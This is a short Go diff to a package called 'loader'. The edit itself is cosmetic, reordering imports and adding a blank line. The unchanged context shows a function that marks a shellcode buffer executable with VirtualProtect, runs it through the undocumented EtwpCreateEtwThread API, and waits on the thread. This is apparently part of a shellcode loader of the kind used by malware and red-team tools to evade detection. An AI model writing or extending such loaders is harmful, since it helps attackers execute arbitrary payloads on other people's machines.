@@ -1,9 +1,10 @@
 package loader
 
 import (
-	"golang.org/x/sys/windows"
 	"unsafe"
 	"variant/wdll"
+
+	"golang.org/x/sys/windows"
 )
 
 func EtwpCreateEtwThread(shellcode []byte) {
@@ -18,5 +19,6 @@ func EtwpCreateEtwThread(shellcode []byte) {
 	_, _, _ = wdll.VirtualProtect().Call(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
 
 	thread, _, _ := wdll.EtwpCreateEtwThread().Call(addr, uintptr(0))
+
 	_, _, _ = wdll.WaitForSingleObject().Call(thread, 0xFFFFFFFF)
 }
